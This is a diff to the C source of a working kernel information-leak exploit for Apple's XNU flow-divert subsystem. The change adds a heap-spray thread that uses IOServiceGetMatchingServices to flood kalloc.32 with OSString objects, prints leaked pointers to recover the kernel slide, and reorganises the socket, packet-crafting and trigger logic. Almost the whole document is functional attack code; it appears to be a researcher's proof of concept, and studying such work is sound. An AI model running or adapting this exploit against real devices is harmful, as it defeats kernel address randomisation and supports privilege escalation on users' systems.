@@ -37,8 +37,14 @@
  * somewhat more difficult to heap spray useful kernel pointers in kalloc.16. It's really quite
  * nice that this bug gives us a choice of zones to leak from. :)
  *
- * We could fill kalloc.32 with OSString instances by triggering OSUnserializeXML from one of
- * numerous Mach traps.
+ * We also start up a worker thread to repeatedly fill kalloc.32 with OSString instances,
+ * increasing the likelihood of leaking a vtable pointer. The easiest way to spray the kernel heap
+ * with OSString instances is using the kernel function OSUnserializeXML, which can be reached from
+ * user space by calling IOServiceGetMatchingServices. Each string in the matching dictionary
+ * passed to this function will cause OSUnserializeXML to create a new OSString instance. By
+ * supplying a matching dictionary with a large number of strings, we can flood kalloc.32 with
+ * OSString instances, which makes it more likely that the information leak will read a vtable
+ * pointer and recover the kernel slide.
  *
  * Exploitation requires root privileges and the ability to bind and connect sockets on a network
  * interface.
@@ -55,22 +61,29 @@
 #include <unistd.h>
 
 #include <CommonCrypto/CommonCrypto.h>
-
-// ---- Header files not available on iOS ---------------------------------------------------------
+#include <CoreFoundation/CoreFoundation.h>
 
 #if __x86_64__
 
+// ---- Header files not available on iOS ---------------------------------------------------------
+
 #include <sys/sys_domain.h>
 #include <sys/kern_control.h>
+
+#include <IOKit/IOKitLib.h>
 
 #else /* __x86_64__ */
 
 // If we're not on x86_64, then we probably don't have access to the above headers. The following
 // definitions are copied directly from the macOS header files.
 
+// ---- Definitions from sys/sys_domain.h ---------------------------------------------------------
+
 #define SYSPROTO_CONTROL	2	/* kernel control protocol */
 
 #define AF_SYS_CONTROL		2	/* corresponding sub address type */
+
+// ---- Definitions from sys/kern_control.h -------------------------------------------------------
 
 #define CTLIOCGINFO     _IOWR('N', 3, struct ctl_info)	/* get id from name */
 
@@ -90,7 +103,30 @@ struct sockaddr_ctl {
     u_int32_t 	sc_reserved[5];
 };
 
+// ---- Definitions from IOKit.framework ----------------------------------------------------------
+
+typedef mach_port_t	io_object_t;
+typedef io_object_t	io_iterator_t;
+
+#define	IO_OBJECT_NULL	((io_object_t) 0)
+
+extern
+const mach_port_t kIOMasterPortDefault;
+
+kern_return_t
+IOObjectRelease(
+	io_object_t	object );
+
+kern_return_t
+IOServiceGetMatchingServices(
+	mach_port_t	masterPort,
+	CFDictionaryRef	matching CF_RELEASES_ARGUMENT,
+	io_iterator_t * existing );
+
 #endif /* __x86_64__ */
+
+// The following definitions are not available in the header files for any platform. They are
+// copied directly from the corresponding header files in XNU.
 
 // ---- Definitions from bsd/sys/socket.h ---------------------------------------------------------
 
@@ -124,7 +160,9 @@ struct flow_divert_packet_header {
 
 // ---- Macros ------------------------------------------------------------------------------------
 
-#if 0
+#define DEBUG 0
+
+#if DEBUG
 #define DEBUG_TRACE(fmt, ...)	printf(fmt"\n", ##__VA_ARGS__)
 #else
 #define DEBUG_TRACE(fmt, ...)
@@ -143,6 +181,11 @@ struct flow_divert_packet_header {
 // The flow-divert signing ID and signing ID size.
 #define SIGNING_ID	"ab789012"
 #define SIGNING_ID_SIZE	8
+
+// The number of elements in the kernel heap spray. Interestingly, in my (very non-methodical)
+// testing, a smaller heap spray size (say, 0x100) is more effective than a larger heap spray size
+// (say, 0x1000).
+static const size_t kernel_heap_spray_size = 0x100;
 
 // The control unit number. We need to know the control unit for the token that's used to register
 // a socket with the flow-divert system. It's easier to use a hard-coded control unit number.
@@ -172,11 +215,20 @@ static struct sockaddr_in6 saddr_in6 = {
 	.sin6_addr     = IN6ADDR_LOOPBACK_INIT,
 };
 
+// The thread that is spraying kalloc.32 with OSString instances.
+static pthread_t kernel_heap_spray_thread;
+
+// Whether kernel_heap_spray_thread should be running.
+static volatile bool kernel_heap_spray_thread_running = true;
+
+// Whether the kernel_heap_spray_thread has finished setup.
+static bool kernel_heap_spray_thread_set_up = false;
+
 // The thread that is receiving messages on ctlfd.
 static pthread_t flow_divert_control_receive_thread;
 
 // Whether flow_divert_control_receive_thread should be running.
-static bool flow_divert_control_receive_thread_running = true;
+static volatile bool flow_divert_control_receive_thread_running = true;
 
 // The error code on the flow_divert_control_receive_thread.
 static int flow_divert_control_receive_thread_error = 0;
@@ -188,92 +240,57 @@ static bool flow_divert_client_closed = false;
 // Whether the information leak was successful.
 static bool infoleak_success = false;
 
-// ---- Functions ---------------------------------------------------------------------------------
+// ---- kernel_heap_spray_thread ------------------------------------------------------------------
 
-// Open the control socket for com.apple.flow-divert. Requires root privileges.
-static int open_flow_divert_control_socket() {
-	ctlfd = socket(PF_SYSTEM, SOCK_DGRAM, SYSPROTO_CONTROL);
-	if (ctlfd < 0) {
-		ERROR("Could not create a system control socket: errno %d", errno);
-		return 1;
+// Create a heap spray CFDictionary that can be passed to IOServiceGetMatchingServices. This
+// dictionary is filled with many unique keys and values, causing many objects of type OSString and
+// OSSymbol to be created in the kernel.
+static CFDictionaryRef create_heap_spray_CFDictionary() {
+	CFStringRef *keys = malloc(kernel_heap_spray_size * sizeof(*keys));
+	CFStringRef *values = malloc(kernel_heap_spray_size * sizeof(*keys));
+	for (size_t i = 0; i < kernel_heap_spray_size; i++) {
+		char str[16];
+		snprintf(str + 1, sizeof(str) - 1, "%zx", i);
+		str[0] = 'k';
+		keys[i] = CFStringCreateWithCString(kCFAllocatorDefault, str,
+				kCFStringEncodingUTF8);
+		str[0] = 'v';
+		values[i] = CFStringCreateWithCString(kCFAllocatorDefault, str,
+				kCFStringEncodingUTF8);
 	}
-	struct ctl_info ctlinfo = { .ctl_id = 0 };
-	strncpy(ctlinfo.ctl_name, FLOW_DIVERT_CONTROL_NAME, sizeof(ctlinfo.ctl_name));
-	int err = ioctl(ctlfd, CTLIOCGINFO, &ctlinfo);
-	if (err) {
-		ERROR("Could not retrieve the control ID number for %s: errno %d",
-				FLOW_DIVERT_CONTROL_NAME, errno);
-		return 2;
-	}
-	struct sockaddr_ctl addr = {
-		.sc_len     = sizeof(addr),
-		.sc_family  = AF_SYSTEM,
-		.ss_sysaddr = AF_SYS_CONTROL,
-		.sc_id      = ctlinfo.ctl_id, // com.apple.flow-divert
-		.sc_unit    = ctl_unit,       // The control group unit number.
-	};
-	err = connect(ctlfd, (struct sockaddr *)&addr, sizeof(addr));
-	if (err) {
-		ERROR("Could not connect to the flow-divert control system (ID %d) "
-				"unit %d: errno %d", addr.sc_id, addr.sc_unit, errno);
-		return 3;
-	}
-	return 0;
+	CFDictionaryRef dict = CFDictionaryCreate(kCFAllocatorDefault,
+			(const void **)keys, (const void **)values, kernel_heap_spray_size,
+			&kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+	free(keys);
+	free(values);
+	return dict;
 }
 
-// Initialize the flow-divert control group.
-static int initialize_flow_divert_control_group() {
-	// Initialize the control group's token key.
-	struct __attribute__((packed)) {
-		uint8_t  packet_type;
-		uint8_t  pad1[3];
-		uint32_t conn_id;
-		uint8_t  token_key_type;
-		uint32_t token_key_length;
-		uint8_t  token_key_value[TOKEN_KEY_SIZE];
-	} group_init = {
-		.packet_type      = FLOW_DIVERT_PKT_GROUP_INIT,
-		.conn_id          = 0,                          // No connection.
-		.token_key_type   = FLOW_DIVERT_TLV_TOKEN_KEY,
-		.token_key_length = htonl(sizeof(group_init.token_key_value)),
-		.token_key_value  = TOKEN_KEY,
-	};
-	ssize_t written = write(ctlfd, &group_init, sizeof(group_init));
-	if (written != sizeof(group_init)) {
-		ERROR("Could not send the %s packet to the flow-divert control socket: errno %d",
-				"GROUP_INIT", errno);
-		return 4;
+// The thread that will be continuously spraying the kernel heap with OSString instances to
+// increase the likelihood of a successful kernel infoleak.
+static void *kernel_heap_spray_thread_func(void *arg) {
+	DEBUG_TRACE("Starting kernel heap spray thread");
+	CFDictionaryRef dict = create_heap_spray_CFDictionary();
+	while (kernel_heap_spray_thread_running) {
+		CFRetain(dict);
+		io_iterator_t iter = IO_OBJECT_NULL;
+		IOServiceGetMatchingServices(kIOMasterPortDefault, dict, &iter);
+		if (iter != IO_OBJECT_NULL) {
+			IOObjectRelease(iter);
+		}
+		if (!kernel_heap_spray_thread_set_up) {
+			DEBUG_TRACE("First kernel heap spray complete");
+			kernel_heap_spray_thread_set_up = true;
+		}
 	}
-	// Set up the control group's signing ID map.
-	struct __attribute__((packed)) {
-		uint8_t  packet_type;
-		uint8_t  pad1[3];
-		uint32_t conn_id;
-		uint8_t  prefix_count_type;
-		uint32_t prefix_count_length;
-		int      prefix_count_value;
-		uint8_t  signing_id_type;
-		uint32_t signing_id_length;
-		char     signing_id_value[SIGNING_ID_SIZE];
-	} app_map_create = {
-		.packet_type         = FLOW_DIVERT_PKT_APP_MAP_CREATE,
-		.conn_id             = 0,
-		.prefix_count_type   = FLOW_DIVERT_TLV_PREFIX_COUNT,
-		.prefix_count_length = htonl(sizeof(app_map_create.prefix_count_value)),
-		.prefix_count_value  = 1,
-		.signing_id_type     = FLOW_DIVERT_TLV_SIGNING_ID,
-		.signing_id_length   = htonl(sizeof(app_map_create.signing_id_value)),
-		.signing_id_value    = SIGNING_ID,
-
-	};
-	written = write(ctlfd, &app_map_create, sizeof(app_map_create));
-	if (written != sizeof(app_map_create)) {
-		ERROR("Could not send the %s packet to the flow-divert control socket: errno %d",
-				"APP_MAP_CREATE", errno);
-		return 5;
-	}
-	return 0;
+	CFRelease(dict);
+	DEBUG_TRACE("Exiting kernel heap spray thread");
+	return NULL;
 }
+
+// ---- flow_divert_control_receive_thread --------------------------------------------------------
+
+#if DEBUG
 
 // Dump data to stdout.
 static void dump(const void *data, size_t size) {
@@ -290,6 +307,8 @@ static void dump(const void *data, size_t size) {
 		off += 16;
 	}
 }
+
+#endif
 
 // Find a TLV tuple in a flow-divert packet.
 static bool find_flow_divert_tlv(const void *data, size_t size, uint8_t type,
@@ -358,7 +377,7 @@ static int send_flow_divert_connect_result_packet(uint32_t conn_id) {
 	if (written != sizeof(connect_result)) {
 		ERROR("Could not send the %s packet to the flow-divert control socket: errno %d",
 				"CONNECT_RESULT", errno);
-		return 6;
+		return 1;
 	}
 	return 0;
 }
@@ -371,9 +390,16 @@ static int send_flow_divert_connect_result_packet(uint32_t conn_id) {
 static int process_kernel_infoleak(const void *data, size_t data_size) {
 	if (data_size <= zone_size) {
 		ERROR("No leaked kernel data. The vulnerability may have been patched.");
-		return 7;
+		return 2;
 	}
+#if DEBUG
 	dump(data, data_size);
+#endif
+	for (size_t offset = zone_size; offset + sizeof(uint64_t) <= data_size;
+			offset += zone_size) {
+		uint64_t leak = *(const uint64_t *)((const uint8_t *)data + offset);
+		printf("0x%016llx\n", leak);
+	}
 	infoleak_success = true;
 	return 0;
 }
@@ -390,7 +416,7 @@ static int handle_flow_divert_connect_packet(const struct flow_divert_packet_hea
 			FLOW_DIVERT_TLV_LOCAL_ADDR, &data_size, &data);
 	if (!have_laddr) {
 		ERROR("The CONNECT packet didn't contain a FLOW_DIVERT_TLV_LOCAL_ADDR tuple");
-		ret = 8;
+		ret = 3;
 	}
 	ret = send_flow_divert_connect_result_packet(hdr->conn_id)
 		|| ret
@@ -433,13 +459,111 @@ static void *flow_divert_control_receive_thread_func(void *arg) {
 	return NULL;
 }
 
+// ---- Functions ---------------------------------------------------------------------------------
+
+// Open the control socket for com.apple.flow-divert. Requires root privileges.
+static int open_flow_divert_control_socket() {
+	ctlfd = socket(PF_SYSTEM, SOCK_DGRAM, SYSPROTO_CONTROL);
+	if (ctlfd < 0) {
+		ERROR("Could not create a system control socket: errno %d", errno);
+		return 4;
+	}
+	struct ctl_info ctlinfo = { .ctl_id = 0 };
+	strncpy(ctlinfo.ctl_name, FLOW_DIVERT_CONTROL_NAME, sizeof(ctlinfo.ctl_name));
+	int err = ioctl(ctlfd, CTLIOCGINFO, &ctlinfo);
+	if (err) {
+		ERROR("Could not retrieve the control ID number for %s: errno %d",
+				FLOW_DIVERT_CONTROL_NAME, errno);
+		return 5;
+	}
+	struct sockaddr_ctl addr = {
+		.sc_len     = sizeof(addr),
+		.sc_family  = AF_SYSTEM,
+		.ss_sysaddr = AF_SYS_CONTROL,
+		.sc_id      = ctlinfo.ctl_id, // com.apple.flow-divert
+		.sc_unit    = ctl_unit,       // The control group unit number.
+	};
+	err = connect(ctlfd, (struct sockaddr *)&addr, sizeof(addr));
+	if (err) {
+		ERROR("Could not connect to the flow-divert control system (ID %d) "
+				"unit %d: errno %d", addr.sc_id, addr.sc_unit, errno);
+		return 6;
+	}
+	return 0;
+}
+
+// Initialize the flow-divert control group.
+static int initialize_flow_divert_control_group() {
+	// Initialize the control group's token key.
+	struct __attribute__((packed)) {
+		uint8_t  packet_type;
+		uint8_t  pad1[3];
+		uint32_t conn_id;
+		uint8_t  token_key_type;
+		uint32_t token_key_length;
+		uint8_t  token_key_value[TOKEN_KEY_SIZE];
+	} group_init = {
+		.packet_type      = FLOW_DIVERT_PKT_GROUP_INIT,
+		.conn_id          = 0,                          // No connection.
+		.token_key_type   = FLOW_DIVERT_TLV_TOKEN_KEY,
+		.token_key_length = htonl(sizeof(group_init.token_key_value)),
+		.token_key_value  = TOKEN_KEY,
+	};
+	ssize_t written = write(ctlfd, &group_init, sizeof(group_init));
+	if (written != sizeof(group_init)) {
+		ERROR("Could not send the %s packet to the flow-divert control socket: errno %d",
+				"GROUP_INIT", errno);
+		return 7;
+	}
+	// Set up the control group's signing ID map.
+	struct __attribute__((packed)) {
+		uint8_t  packet_type;
+		uint8_t  pad1[3];
+		uint32_t conn_id;
+		uint8_t  prefix_count_type;
+		uint32_t prefix_count_length;
+		int      prefix_count_value;
+		uint8_t  signing_id_type;
+		uint32_t signing_id_length;
+		char     signing_id_value[SIGNING_ID_SIZE];
+	} app_map_create = {
+		.packet_type         = FLOW_DIVERT_PKT_APP_MAP_CREATE,
+		.conn_id             = 0,
+		.prefix_count_type   = FLOW_DIVERT_TLV_PREFIX_COUNT,
+		.prefix_count_length = htonl(sizeof(app_map_create.prefix_count_value)),
+		.prefix_count_value  = 1,
+		.signing_id_type     = FLOW_DIVERT_TLV_SIGNING_ID,
+		.signing_id_length   = htonl(sizeof(app_map_create.signing_id_value)),
+		.signing_id_value    = SIGNING_ID,
+
+	};
+	written = write(ctlfd, &app_map_create, sizeof(app_map_create));
+	if (written != sizeof(app_map_create)) {
+		ERROR("Could not send the %s packet to the flow-divert control socket: errno %d",
+				"APP_MAP_CREATE", errno);
+		return 8;
+	}
+	return 0;
+}
+
+// Create a thread to spray the kernel heap with useful pointers to leak.
+static int create_kernel_heap_spray_thread() {
+	int err = pthread_create(&kernel_heap_spray_thread, NULL,
+			kernel_heap_spray_thread_func, NULL);
+	if (err) {
+		ERROR("Could not spawn %s: errno %d", "kernel_heap_spray_thread", err);
+		return 9;
+	}
+	return 0;
+}
+
 // Create a thread to receive and process messages from the flow-divert control socket.
 static int create_flow_divert_control_receive_thread() {
 	int err = pthread_create(&flow_divert_control_receive_thread, NULL,
 			flow_divert_control_receive_thread_func, NULL);
 	if (err) {
 		ERROR("Could not spawn %s: errno %d", "flow_divert_control_receive_thread", err);
-		return 9;
+		return 10;
 	}
 	return 0;
 }
@@ -449,7 +573,7 @@ int create_flow_divert_client_socket() {
 	sockfd = socket(AF_INET6, SOCK_DGRAM, 0);
 	if (sockfd < 0) {
 		ERROR("Could not create AF_INET6 socket: errno %d", errno);
-		return 10;
+		return 11;
 	}
 	struct __attribute__((packed)) token {
 		uint8_t  ctl_unit_type;
@@ -476,7 +600,7 @@ int create_flow_divert_client_socket() {
 	int err = setsockopt(sockfd, SOL_SOCKET, SO_FLOW_DIVERT_TOKEN, &token, sizeof(token));
 	if (err) {
 		ERROR("Could not set flow-divert token on socket: errno %d", errno);
-		return 11;
+		return 12;
 	}
 	return 0;
 }
@@ -489,7 +613,7 @@ static int connect_flow_divert_client_socket() {
 	if (interface_index == 0) {
 		ERROR("Could not retrieve interface index for interface %s: errno %d",
 				"lo0", errno);
-		return 12;
+		return 13;
 	}
 	saddr_in6.sin6_scope_id = interface_index;
 	// We need to bind the socket to an address before calling connect in order to trigger the
@@ -497,7 +621,7 @@ static int connect_flow_divert_client_socket() {
 	int err = bind(sockfd, (struct sockaddr *)&saddr_in6, sizeof(saddr_in6));
 	if (err) {
 		ERROR("Could not bind flow-divert client socket: errno %d", errno);
-		return 13;
+		return 14;
 	}
 	// Execute flow_divert_connect_out, generating a CONNECT packet that will contain the
 	// leaked kernel heap data. This syscall won't return until after we send the
@@ -505,7 +629,7 @@ static int connect_flow_divert_client_socket() {
 	err = connect(sockfd, (struct sockaddr *)&saddr_in6, sizeof(saddr_in6));
 	if (err) {
 		ERROR("Could not connect flow-divert client socket: errno %d", errno);
-		return 14;
+		return 15;
 	}
 	return 0;
 }
@@ -540,11 +664,30 @@ static int clean_up_flow_divert_client_state() {
 	// packet, despite waiting for about two seconds. Give up and assume that the system isn't
 	// working the way we expect it to.
 	ERROR("Timeout while waiting for flow-divert to respond");
-	return 15;
+	return 16;
 }
 
-// Clean up all state for the flow-divert system, including the flow_divert_control_receive_thread.
-static void clean_up_flow_divert_state() {
+// Set up all state for the flow-divert control system. This includes creating the flow-divert
+// control socket, initializing the flow-divert control group, and creating the
+// flow_divert_control_receive_thread.
+static int set_up_flow_divert_control_state() {
+	int ret = open_flow_divert_control_socket()
+		|| initialize_flow_divert_control_group()
+		|| create_kernel_heap_spray_thread()
+		|| create_flow_divert_control_receive_thread();
+	if (ret == 0) {
+		// Wait for the first heap spray to take place.
+		while (!kernel_heap_spray_thread_set_up) {
+			usleep(1000);
+		}
+	}
+	return ret;
+}
+
+// Clean up all state for the flow-divert system established in set_up_flow_divert_control_state().
+static void clean_up_flow_divert_control_state() {
+	kernel_heap_spray_thread_running = false;
+	pthread_join(kernel_heap_spray_thread, NULL);
 	if (ctlfd >= 0) {
 		close(ctlfd);
 		ctlfd = -1;
@@ -553,28 +696,34 @@ static void clean_up_flow_divert_state() {
 	pthread_join(flow_divert_control_receive_thread, NULL);
 }
 
+// Try to trigger the infoleak by creating a flow-divert client socket and calling connect() on
+// that socket. The flow_divert_control_receive_thread established earlier should receive the
+// CONNECT packet from the kernel with the infoleak.
+static int try_flow_divert_client_leak() {
+	int ret = create_flow_divert_client_socket()
+		|| connect_flow_divert_client_socket();
+	int ret2 = clean_up_flow_divert_client_state();
+	return ret || ret2;
+}
+
 // Run the infoleak exploit.
 static int flow_divert_infoleak() {
-	int ret = open_flow_divert_control_socket()
-		|| initialize_flow_divert_control_group()
-		|| create_flow_divert_control_receive_thread();
+	int ret = set_up_flow_divert_control_state();
 	if (ret == 0) {
 		for (size_t try = 1;; try++) {
-			ret = create_flow_divert_client_socket()
-				|| connect_flow_divert_client_socket();
-			int ret2 = clean_up_flow_divert_client_state();
-			ret = ret || ret2;
+			ret = try_flow_divert_client_leak();
+			if (ret != 0 || infoleak_success) {
+				break;
+			}
 			if (ret == 0 && try >= 1000) {
 				ERROR("Could not trigger infoleak after %zu attempts", try);
-				ret = 16;
-			}
-			if (ret != 0 || infoleak_success) {
+				ret = 17;
 				break;
 			}
 			usleep(50 * 1000);
 		}
 	}
-	clean_up_flow_divert_state();
+	clean_up_flow_divert_control_state();
 	return ret;
 }
 
